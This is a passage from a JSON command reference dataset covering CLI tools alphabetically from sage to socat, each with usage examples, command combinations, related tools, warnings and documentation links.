        "commands": "sage -c \"print([p for p in primes(100) if is_prime(2^p - 1)][:5])\"",
        "explanation": "Find first 5 Mersenne primes under 100",
        "title": "sage"
      }
    ],
    "relatedCommands": [
      {
        "name": "python3",
        "relationship": "combo",
        "reason": "Sage is built on Python and uses Python syntax"
      },
      {
        "name": "jupyter",
        "relationship": "combo",
        "reason": "Sage can run in Jupyter notebooks"
      },
      {
        "name": "mathematica",
        "relationship": "alternative",
        "reason": "Commercial computer algebra system"
      }
    ],
    "warnings": [
      "Large installation size with many dependencies",
      "Some functionality overlaps with specialized tools",
      "Updates can take significant time"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://doc.sagemath.org/"
      },
      {
        "platform": "macos",
        "url": "https://doc.sagemath.org/"
      },
      {
        "platform": "windows",
        "url": "https://doc.sagemath.org/"
      },
      {
        "platform": "generic",
        "url": "https://doc.sagemath.org/html/en/tutorial/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sam",
    "subtitle": "Serverless Application Model",
    "description": "AWS Serverless Application Model for serverless development",
    "examples": [
      "sam init --runtime python3.9 --name my-serverless-app --app-template hello-world  # Create new serverless application from template",
      "sam build --use-container  # Build application using Docker containers for consistent environment",
      "sam deploy --guided --stack-name my-serverless-stack  # Deploy application with guided configuration setup",
      "sam local start-api --port 8080  # Start local API Gateway for testing Lambda functions",
      "sam local invoke HelloWorldFunction --event events/event.json  # Test Lambda function locally with sample event data",
      "sam local generate-event s3 put --bucket my-bucket --key my-key  # Generate sample S3 event for local testing",
      "sam validate --template template.yaml  # Check SAM template for syntax and logical errors",
      "sam package --s3-bucket my-deployment-bucket --output-template-file packaged-template.yaml  # Package and upload application artifacts to S3"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sam [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete development workflow",
        "commands": "sam build && sam local start-api --port 3000 &",
        "explanation": "Build application and start local development server",
        "title": "sam && sam &"
      },
      {
        "scenario": "Production deployment",
        "commands": "sam build --use-container && sam deploy --stack-name prod-app --parameter-overrides Environment=production",
        "explanation": "Build with containers and deploy to production environment",
        "title": "sam && sam"
      }
    ],
    "relatedCommands": [
      {
        "name": "aws",
        "relationship": "combo",
        "reason": "SAM deploys to AWS using CloudFormation"
      },
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "SAM uses Docker for local development"
      }
    ],
    "warnings": [
      "Requires Docker for local development features",
      "SAM templates are CloudFormation extensions",
      "Local testing may not match AWS Lambda environment exactly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.aws.amazon.com/serverless-application-model/"
      },
      {
        "platform": "macos",
        "url": "https://docs.aws.amazon.com/serverless-application-model/"
      },
      {
        "platform": "windows",
        "url": "https://docs.aws.amazon.com/serverless-application-model/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sar",
    "subtitle": "System Activity Reporter",
    "description": "System Activity Reporter for collecting and reporting system statistics",
    "examples": [
      "sar -u 1 10  # Display CPU utilization every second for 10 intervals",
      "sar -r 5 6  # Show memory utilization every 5 seconds for 6 intervals",
      "sar -b 2 5  # Display I/O and transfer statistics",
      "sar -n DEV 1 5  # Show network device statistics",
      "sar -q 3 4  # Display load average and run queue length",
      "sar -u -f /var/log/sysstat/sa01  # Display historical CPU data from system logs"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "sar [options] [interval] [count]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Daily system report",
        "commands": "sar -u -r -b -q 1 60 > daily_report.txt",
        "explanation": "Generate comprehensive hourly system report",
        "title": "sar > daily_report"
      }
    ],
    "relatedCommands": [
      {
        "name": "iostat",
        "relationship": "related",
        "reason": "Both are part of sysstat package and complement each other"
      },
      {
        "name": "vmstat",
        "relationship": "similar",
        "reason": "Both provide system performance statistics"
      }
    ],
    "warnings": [
      "Part of sysstat package",
      "Can read historical data from system logs",
      "Rich set of options for different statistics"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/sar.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/sar.html"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sbt",
    "subtitle": "Simple Build Tool",
    "description": "Interactive build tool for Scala and Java projects",
    "examples": [
      "sbt  # Launch interactive SBT shell",
      "sbt compile  # Compile source code",
      "sbt test  # Execute test suite",
      "sbt run  # Execute main application",
      "sbt package  # Create JAR file from compiled code",
      "sbt ~compile  # Automatically recompile when files change",
      "sbt dependencyTree  # Display project dependency tree"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sbt [options] [commands]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "sbt clean compile test package",
        "explanation": "Clean, compile, test, and package project",
        "title": "sbt"
      }
    ],
    "relatedCommands": [
      {
        "name": "maven",
        "relationship": "alternative",
        "reason": "Maven can also build Scala projects"
      },
      {
        "name": "gradle",
        "relationship": "alternative",
        "reason": "Gradle also supports Scala builds"
      }
    ],
    "warnings": [
      "Uses build.sbt files for configuration",
      "Interactive shell is very powerful for development",
      "Specific to Scala ecosystem but supports Java"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.scala-sbt.org/documentation.html"
      },
      {
        "platform": "macos",
        "url": "https://www.scala-sbt.org/documentation.html"
      },
      {
        "platform": "windows",
        "url": "https://www.scala-sbt.org/documentation.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "scilab",
    "subtitle": "Scientific Laboratory",
    "description": "Open source software for numerical computation",
    "examples": [
      "scilab  # Launch Scilab graphical environment",
      "scilab -nw  # Start Scilab without windowing system",
      "scilab -f script.sce  # Execute Scilab script file",
      "scilab -e \"disp('Hello'); exit;\"  # Run Scilab code then exit",
      "scilab -ns  # Start without executing startup scripts"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "scilab [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Matrix computation",
        "commands": "scilab -e \"A = rand(5,5); [U,S,V] = svd(A); disp(S); exit;\"",
        "explanation": "Generate random matrix and compute SVD",
        "title": "scilab ; ; disp ; exit ;"
      },
      {
        "scenario": "Signal processing",
        "commands": "scilab -f signal_analysis.sce",
        "explanation": "Run signal processing script",
        "title": "scilab"
      }
    ],
    "relatedCommands": [
      {
        "name": "octave",
        "relationship": "similar",
        "reason": "Both MATLAB-compatible numerical computing"
      },
      {
        "name": "matlab",
        "relationship": "alternative",
        "reason": "Commercial alternative with similar capabilities"
      },
      {
        "name": "python3",
        "relationship": "alternative",
        "reason": "NumPy/SciPy for numerical computing"
      }
    ],
    "warnings": [
      "Syntax differs slightly from MATLAB/Octave",
      "GUI can be resource-intensive",
      "Some advanced toolboxes require separate installation"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.scilab.org/resources/documentation"
      },
      {
        "platform": "macos",
        "url": "https://www.scilab.org/resources/documentation"
      },
      {
        "platform": "windows",
        "url": "https://www.scilab.org/resources/documentation"
      },
      {
        "platform": "generic",
        "url": "https://help.scilab.org/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "scp",
    "subtitle": "secure copy protocol",
    "description": "Secure copy files over SSH",
    "examples": [
      "scp file.txt user@server:/home/user/  # Upload local file to remote server directory",
      "scp user@server:/path/file.txt .  # Download file from remote server to current directory",
      "scp -r project/ user@server:/opt/  # Upload entire directory structure to remote server",
      "scp -P 2222 file.txt user@server:~/  # Transfer file using non-standard SSH port",
      "scp -p script.sh user@server:~/bin/  # Copy file while maintaining original timestamps and permissions"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "scp [options] <source> <destination>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Backup files to remote server",
        "commands": "tar -czf backup.tar.gz ~/important && scp backup.tar.gz user@backup-server:~/backups/",
        "explanation": "Create archive and upload to backup server",
        "title": "tar && scp"
      },
      {
        "scenario": "Deploy application files",
        "commands": "scp -r dist/ user@production:/var/www/app/ && ssh user@production 'sudo systemctl restart nginx'",
        "explanation": "Deploy files and restart web server",
        "title": "scp && ssh"
      }
    ],
    "relatedCommands": [
      {
        "name": "rsync",
        "relationship": "alternative",
        "reason": "More efficient for large transfers and syncing"
      },
      {
        "name": "ssh",
        "relationship": "combo",
        "reason": "Uses SSH protocol for secure transfer"
      },
      {
        "name": "sftp",
        "relationship": "similar",
        "reason": "Interactive file transfer over SSH"
      }
    ],
    "warnings": [
      "Use -P (capital P) for port, not -p like SSH",
      "Recursive copy requires -r flag",
      "Overwrites destination files without warning"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/scp.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/scp.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "screen",
    "subtitle": "Screen",
    "description": "Terminal multiplexer for persistent sessions",
    "examples": [
      "screen  # Start new screen session",
      "screen -S mysession  # Start screen session with name 'mysession'",
      "screen -ls  # Show all active screen sessions",
      "screen -r mysession  # Reattach to named session",
      "Ctrl+A, d  # Detach from current session (key combination)",
      "screen -dm -S backup ./backup.sh  # Run backup script in detached screen session"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "screen [options] [command]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Remote work session",
        "commands": "screen -S work && echo 'Started work session - use Ctrl+A,d to detach'",
        "explanation": "Start named work session for remote development",
        "title": "screen && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "tmux",
        "relationship": "modern-alternative",
        "reason": "tmux is more modern terminal multiplexer with better features"
      },
      {
        "name": "nohup",
        "relationship": "simple-alternative",
        "reason": "nohup keeps processes running but without session management"
      }
    ],
    "warnings": [
      "Ctrl+A is prefix key for screen commands",
      "Sessions persist after SSH disconnection",
      "Learning curve for key bindings"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/screen.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/screen.html"
      },
      {
        "platform": "windows",
        "url": "Not available (use WSL or Windows Terminal)"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "script",
    "subtitle": "Script",
    "description": "Record terminal session to file",
    "examples": [
      "script session.log  # Start recording terminal session to file",
      "script -a session.log  # Append session recording to existing file",
      "script -q session.log  # Record session without start/end messages",
      "script -t 2>timing.txt session.log  # Record session with timing information"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "script [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Training documentation",
        "commands": "script training_session.log && echo 'Session recorded for training purposes'",
        "explanation": "Record terminal session for training or documentation",
        "title": "script && echo"
      }
    ],
    "relatedCommands": [
      {
        "name": "scriptreplay",
        "relationship": "combo",
        "reason": "scriptreplay can replay sessions recorded with script"
      },
      {
        "name": "asciinema",
        "relationship": "modern-alternative",
        "reason": "asciinema provides better terminal recording and sharing"
      }
    ],
    "warnings": [
      "Records everything including passwords - be careful",
      "Exit with 'exit' command to stop recording",
      "Useful for documentation and troubleshooting"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/script.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/script.html"
      },
      {
        "platform": "windows",
        "url": "Use Start-Transcript in PowerShell"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sed",
    "subtitle": "stream editor",
    "description": "Stream editor for filtering and transforming text",
    "examples": [
      "sed 's/old/new/g' file.txt  # Replace all occurrences of 'old' with 'new'",
      "sed '/pattern/d' file.txt  # Remove all lines containing 'pattern'",
      "sed '3i\\This is inserted text' file.txt  # Insert text before line 3",
      "sed -n '10,20p' file.txt  # Print only lines 10 through 20",
      "sed -i 's/foo/bar/g' *.txt  # Replace 'foo' with 'bar' in all text files"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "sed [options] 'command' [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Clean and format configuration files",
        "commands": "sed 's/#.*//; /^$/d' config.txt | sed 's/^[ \\t]*//'",
        "explanation": "Remove comments, empty lines, and leading whitespace",
        "title": "sed ; | sed"
      },
      {
        "scenario": "Extract data between markers",
        "commands": "sed -n '/START/,/END/p' data.txt | sed '1d;$d'",
        "explanation": "Extract text between START and END markers, excluding markers",
        "title": "sed | sed ;"
      }
    ],
    "relatedCommands": [
      {
        "name": "awk",
        "relationship": "similar",
        "reason": "Both process text streams, awk better for field-based data"
      },
      {
        "name": "tr",
        "relationship": "similar",
        "reason": "Simple character replacement and deletion"
      },
      {
        "name": "grep",
        "relationship": "combo",
        "reason": "Grep finds patterns, sed modifies them"
      }
    ],
    "warnings": [
      "sed -i behavior differs between GNU and BSD versions",
      "Regular expressions vary between sed implementations",
      "Always backup files before using -i flag"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/sed.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/sed.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/sed/manual/"
      }
    ],
    "distroNotes": {
      "macos": "BSD sed - some syntax differs from GNU sed",
      "windows": "Available in WSL or Git Bash"
    }
  },
  {
    "name": "selenium-webdriver",
    "subtitle": "Selenium WebDriver",
    "description": "Web browser automation for testing web applications",
    "examples": [
      "python -m pytest test_selenium.py  # Run Selenium tests written in Python",
      "java -jar selenium-server-4.0.0.jar hub  # Start Selenium Grid hub for distributed testing",
      "java -jar selenium-server-4.0.0.jar node  # Start Selenium Grid node",
      "webdriver-manager update  # Update browser drivers for Selenium (Python)"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "Various APIs in different languages",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Setup and run Selenium tests",
        "commands": "webdriver-manager update && python -m pytest tests/selenium/",
        "explanation": "Update drivers then run Selenium test suite",
        "title": "webdriver && python"
      }
    ],
    "relatedCommands": [
      {
        "name": "cypress",
        "relationship": "modern-alternative",
        "reason": "Cypress provides better developer experience"
      },
      {
        "name": "playwright",
        "relationship": "modern-alternative",
        "reason": "Playwright offers better cross-browser support"
      }
    ],
    "warnings": [
      "Requires browser drivers to be installed and managed",
      "Can be flaky due to timing issues",
      "Multiple language bindings available"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://selenium-python.readthedocs.io/"
      },
      {
        "platform": "macos",
        "url": "https://selenium-python.readthedocs.io/"
      },
      {
        "platform": "windows",
        "url": "https://selenium-python.readthedocs.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sentry-cli",
    "subtitle": "Sentry Command Line Interface",
    "description": "Command-line client for Sentry error tracking and performance monitoring",
    "examples": [
      "sentry-cli sourcemaps upload --validate dist/  # Upload JavaScript source maps for error tracking",
      "sentry-cli releases new v1.0.0  # Create new release in Sentry",
      "sentry-cli releases deploys v1.0.0 new -e production  # Mark release as deployed to production",
      "sentry-cli issues list  # List recent issues in project",
      "sentry-cli send-event -m 'Test error message'  # Send test error event to Sentry"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sentry-cli [command] [options]",
    "prerequisites": [
      "sentry-account"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete release workflow",
        "commands": "sentry-cli releases new v1.0.0 && sentry-cli sourcemaps upload dist/ && sentry-cli releases finalize v1.0.0",
        "explanation": "Create release, upload sourcemaps, and finalize",
        "title": "sentry && sentry && sentry"
      }
    ],
    "relatedCommands": [
      {
        "name": "bugsnag",
        "relationship": "alternative",
        "reason": "Alternative error tracking service"
      },
      {
        "name": "rollbar",
        "relationship": "alternative",
        "reason": "Alternative error tracking and monitoring"
      }
    ],
    "warnings": [
      "Requires Sentry authentication token",
      "Source maps must match deployed code exactly",
      "Release management affects error grouping"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://docs.sentry.io/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "seq",
    "subtitle": "Sequence",
    "description": "Generate sequence of numbers",
    "examples": [
      "seq 1 10  # Generate numbers from 1 to 10",
      "seq 0 5 50  # Generate numbers from 0 to 50 with increment of 5",
      "seq 1.0 0.1 2.0  # Generate decimal sequence with 0.1 increment",
      "seq -s ',' 1 5  # Generate sequence with comma separator",
      "seq -w 1 100  # Generate sequence with zero-padding",
      "seq -f 'item_%03g' 1 5  # Generate formatted sequence: item_001, item_002, etc."
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "seq [first] [increment] last",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Batch file processing",
        "commands": "for i in $(seq 1 10); do echo \"Processing file $i\"; done",
        "explanation": "Use sequence in shell loop for batch processing",
        "title": "for ; do ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "shuf",
        "relationship": "combo",
        "reason": "seq generates ordered numbers, shuf can randomize them"
      },
      {
        "name": "range",
        "relationship": "similar",
        "reason": "Some shells have built-in range generation"
      }
    ],
    "warnings": [
      "Very useful for shell scripting and automation",
      "Supports floating-point sequences",
      "Format string allows custom output formatting"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/seq.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/seq.html"
      },
      {
        "platform": "windows",
        "url": "PowerShell: 1..10 or Get-Sequence cmdlet"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sequelize-cli",
    "subtitle": "Sequelize CLI",
    "description": "Command-line interface for Sequelize ORM",
    "examples": [
      "npx sequelize-cli init  # Create initial Sequelize project structure",
      "npx sequelize-cli migration:generate --name create-users  # Generate new migration file for users table",
      "npx sequelize-cli db:migrate  # Apply all pending migrations to database",
      "npx sequelize-cli model:generate --name User --attributes firstName:string,email:string  # Generate User model with migration file",
      "npx sequelize-cli seed:generate --name demo-users  # Generate seeder file for sample data",
      "npx sequelize-cli db:seed:all  # Execute all seeder files"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "npx sequelize-cli <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Fresh database setup",
        "commands": "npx sequelize-cli db:create && npx sequelize-cli db:migrate && npx sequelize-cli db:seed:all",
        "explanation": "Create database, run migrations, and seed data",
        "title": "npx && npx && npx"
      }
    ],
    "relatedCommands": [
      {
        "name": "node",
        "relationship": "underlying",
        "reason": "Sequelize is a Node.js ORM"
      },
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "Installed and managed via npm"
      }
    ],
    "warnings": [
      "Config file must match database connection details",
      "Migration order is important for dependencies",
      "Model associations need proper configuration"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://sequelize.org/docs/v6/other-topics/migrations/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "shuf",
    "subtitle": "Shuffle",
    "description": "Generate random permutations of lines",
    "examples": [
      "shuf file.txt  # Randomize order of lines in file",
      "shuf -n 5 file.txt  # Pick 5 random lines from file",
      "shuf -i 1-100 -n 10  # Generate 10 random numbers between 1 and 100",
      "shuf -r -n 5 file.txt  # Pick 5 random lines with repetition allowed",
      "shuf --random-source=/dev/urandom file.txt  # Use specific random source for shuffling"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "text-processing",
    "safety": "safe",
    "syntaxPattern": "shuf [options] [files]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Random playlist creation",
        "commands": "find ~/Music -name '*.mp3' | shuf -n 20 > playlist.m3u",
        "explanation": "Create random playlist of 20 songs",
        "title": "find | shuf > playlist"
      }
    ],
    "relatedCommands": [
      {
        "name": "sort",
        "relationship": "opposite",
        "reason": "sort orders lines, shuf randomizes order"
      },
      {
        "name": "seq",
        "relationship": "combo",
        "reason": "seq generates sequences that shuf can randomize"
      }
    ],
    "warnings": [
      "Useful for randomizing data and creating samples",
      "Can generate random numbers within ranges",
      "Good for testing and data analysis"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/shuf.1.html"
      },
      {
        "platform": "macos",
        "url": "Install via homebrew: brew install coreutils"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "skaffold",
    "subtitle": "Skaffold",
    "description": "Command line tool for continuous development on Kubernetes",
    "examples": [
      "skaffold init --compose-file docker-compose.yml  # Generate skaffold.yaml from existing Docker Compose file",
      "skaffold dev --port-forward  # Build, deploy, and watch for changes with port forwarding",
      "skaffold run --tail  # Build and deploy once, then tail application logs",
      "skaffold run --profile production  # Deploy using production configuration profile",
      "skaffold build --file-output artifacts.json  # Build images and output artifact details to file",
      "skaffold deploy --build-artifacts artifacts.json  # Deploy using previously built artifacts",
      "skaffold debug --port-forward  # Deploy with debugging enabled and port forwarding",
      "skaffold delete  # Delete all deployed Kubernetes resources"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "skaffold [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CI/CD pipeline",
        "commands": "skaffold build --quiet && skaffold deploy --build-artifacts artifacts.json",
        "explanation": "Build images in CI, then deploy in CD pipeline",
        "title": "skaffold && skaffold"
      },
      {
        "scenario": "Multi-environment workflow",
        "commands": "skaffold build --profile staging && skaffold deploy --profile production --build-artifacts artifacts.json",
        "explanation": "Build with staging profile, deploy with production profile",
        "title": "skaffold && skaffold"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "combo",
        "reason": "Skaffold builds Docker images"
      },
      {
        "name": "kubectl",
        "relationship": "combo",
        "reason": "Skaffold deploys to Kubernetes"
      }
    ],
    "warnings": [
      "Requires Docker daemon for image building",
      "File watching may not work with all filesystem types",
      "Port forwarding conflicts possible with multiple applications",
      "Resource cleanup important to avoid conflicts"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://skaffold.dev/docs/references/cli/"
      },
      {
        "platform": "macos",
        "url": "https://skaffold.dev/docs/references/cli/"
      },
      {
        "platform": "windows",
        "url": "https://skaffold.dev/docs/references/cli/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sl",
    "subtitle": "Steam Locomotive",
    "description": "Display animated steam locomotive",
    "examples": [
      "sl  # Display steam locomotive animation",
      "sl -F  # Make the train fly",
      "sl -l  # Display smaller locomotive",
      "sl -a  # Show train accident animation"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "sl [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Easter egg for typo",
        "commands": "alias ls=sl",
        "explanation": "Prank alias that shows train when user types 'ls'",
        "title": "alias"
      }
    ],
    "relatedCommands": [
      {
        "name": "ls",
        "relationship": "typo-target",
        "reason": "sl is often triggered by mistyping 'ls'"
      }
    ],
    "warnings": [
      "Famous Unix easter egg and prank program",
      "Must wait for animation to complete",
      "Not installed by default, needs separate installation"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/mtoyoda/sl"
      },
      {
        "platform": "macos",
        "url": "Install via homebrew: brew install sl"
      },
      {
        "platform": "windows",
        "url": "Not available"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "sleuthkit",
    "subtitle": "The Sleuth Kit",
    "description": "Digital forensics toolkit for file system analysis",
    "examples": [
      "fls -r disk_image.dd  # Recursively list all files in disk image",
      "fls -rd disk_image.dd  # Show deleted files in disk image",
      "icat disk_image.dd 12345 > recovered_file.txt  # Extract file contents using inode number",
      "mactime -b timeline.txt > timeline.csv  # Generate timeline from file system metadata"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "dangerous",
    "syntaxPattern": "<tsk-tool> [options] <disk-image>",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete forensic file analysis",
        "commands": "mmls disk_image.dd && fls -r disk_image.dd && mactime -b timeline.txt",
        "explanation": "Show partitions, list files, and create timeline",
        "title": "mmls && fls && mactime"
      }
    ],
    "relatedCommands": [
      {
        "name": "autopsy",
        "relationship": "combo",
        "reason": "GUI frontend for Sleuth Kit"
      },
      {
        "name": "dd",
        "relationship": "combo",
        "reason": "Create disk images for analysis"
      }
    ],
    "warnings": [
      "Requires understanding of file system structures",
      "Write-blocking important to preserve evidence",
      "Different tools for different file system types"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "http://sleuthkit.org/sleuthkit/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "snap",
    "subtitle": "Snappy package manager",
    "description": "Universal package manager for Linux applications",
    "examples": [
      "sudo snap install code --classic  # Install Visual Studio Code with classic confinement",
      "snap list  # Show all installed snap packages",
      "sudo snap refresh  # Update all snap packages to latest versions",
      "snap find discord  # Search snap store for Discord packages",
      "snap info firefox  # Display information about Firefox snap",
      "sudo snap remove package-name  # Uninstall snap package",
      "sudo snap install nextcloud --channel=edge  # Install from edge channel (development version)"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "snap <command> [package]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Developer tools installation",
        "commands": "sudo snap install code --classic && sudo snap install discord",
        "explanation": "Install development environment apps via snap",
        "title": "sudo && sudo"
      },
      {
        "scenario": "System maintenance",
        "commands": "sudo snap refresh && snap list --all",
        "explanation": "Update all snaps and show version history",
        "title": "sudo && snap"
      }
    ],
    "relatedCommands": [
      {
        "name": "flatpak",
        "relationship": "similar",
        "reason": "Another universal package format for Linux"
      },
      {
        "name": "apt",
        "relationship": "combo",
        "reason": "Often used alongside traditional package managers"
      },
      {
        "name": "appimage",
        "relationship": "alternative",
        "reason": "Portable application format"
      }
    ],
    "warnings": [
      "Classic confinement required for some applications",
      "Automatic updates can't be disabled easily",
      "Larger size compared to traditional packages"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://snapcraft.io/docs"
      },
      {
        "platform": "generic",
        "url": "https://snapcraft.io/docs/getting-started"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "snort",
    "subtitle": "Snort",
    "description": "Network intrusion detection and prevention system",
    "examples": [
      "snort -c /etc/snort/snort.conf -i eth0  # Run Snort IDS on network interface",
      "snort -dev -l /var/log/snort -i eth0  # Log all packets to directory for analysis",
      "snort -T -c /etc/snort/snort.conf  # Test Snort configuration file syntax",
      "snort -c /etc/snort/snort.conf -r capture.pcap  # Analyze captured packets against IDS rules"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "snort [options] -c <config-file>",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete IDS deployment",
        "commands": "snort -T -c /etc/snort/snort.conf && snort -c /etc/snort/snort.conf -i eth0 -D",
        "explanation": "Test configuration then run as daemon",
        "title": "snort && snort"
      }
    ],
    "relatedCommands": [
      {
        "name": "suricata",
        "relationship": "similar",
        "reason": "Alternative network IDS/IPS system"
      },
      {
        "name": "tcpdump",
        "relationship": "combo",
        "reason": "Packet capture for Snort analysis"
      }
    ],
    "warnings": [
      "Requires careful rule configuration to avoid false positives",
      "Can impact network performance",
      "Regular rule updates needed for effectiveness"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://snort.org/documents"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "socat",
    "subtitle": "Socket Cat",
    "description": "Advanced multipurpose relay tool for network connections",
    "examples": [
      "socat TCP-LISTEN:8080,fork TCP:remote-host:80  # Forward local port 8080 to remote host port 80",
      "socat TCP-LISTEN:8443,fork OPENSSL:secure-server:443  # Create SSL proxy to secure server",
      "socat UNIX-LISTEN:/tmp/socket TCP:localhost:8080  # Bridge Unix socket to TCP connection",
      "socat TCP-LISTEN:2001 /dev/ttyS0,raw  # Bridge serial port to TCP connection",
      "socat TCP-LISTEN:3128,fork TCP:proxy-server:8080  # Create HTTP proxy forwarder"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "socat [options] address1 address2",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Secure tunnel setup",
        "commands": "socat OPENSSL-LISTEN:4443,cert=server.crt,key=server.key,fork TCP:localhost:22",
        "explanation": "Create SSL tunnel for SSH connection",
        "title": "socat"
      }
    ],
    "relatedCommands": [
      {
        "name": "netcat",
        "relationship": "simpler-alternative",
        "reason": "netcat is simpler but less powerful"
      },
      {
        "name": "ssh",
        "relationship": "alternative",
